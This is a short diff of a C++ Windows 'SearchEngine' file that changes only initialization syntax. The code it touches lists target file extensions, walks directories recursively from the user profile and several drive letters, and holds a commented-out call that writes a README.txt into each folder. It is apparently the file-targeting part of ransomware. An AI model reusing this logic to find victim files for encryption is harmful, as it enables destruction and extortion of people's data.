@@ -1,6 +1,6 @@
 #include "SearchEngine.h"
 
-std::vector<String> ext =
+std::vector<String> ext
 {
     _T("txt"),    _T("jar"),    _T("dat"),   _T("contact"), _T("settings"), _T("doc"),     _T("docx"), _T("xls"),
     _T("xlsx"),   _T("ppt"),    _T("pptx"),  _T("odt"),     _T("jpg"),      _T("png"),     _T("jpeg"), _T("gif"),   _T("csv"),
@@ -30,7 +30,7 @@ VOID SearchEngine::FindFile(String dir)
 {
     dir += _T("\\");
     WIN32_FIND_DATA FindData;
-    HANDLE hFind = FindFirstFile((dir + _T("*")).c_str(), &FindData);
+    HANDLE hFind{ FindFirstFile((dir + _T("*")).c_str(), &FindData) };
 
     if (hFind != INVALID_HANDLE_VALUE)
     {
@@ -41,7 +41,7 @@ VOID SearchEngine::FindFile(String dir)
                 FindData.cFileName[0] == _T('.'))
                 continue;
 
-            String Path = dir + FindData.cFileName;
+            String Path{ dir + FindData.cFileName };
             //Utils::Readme(dir + _T("\\README.txt"));
 
             if (!(FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
@@ -66,7 +66,7 @@ VOID SearchEngine::FindFile(String dir)
 
 VOID SearchEngine::Start()
 {
-    std::vector<String> drives =
+    std::vector<String> drives
     {
         _T("C:\\Users\\") + Utils::UserName(),
         _T("K:"), _T("L:"), _T("M:"), _T("N:"), _T("O:"),
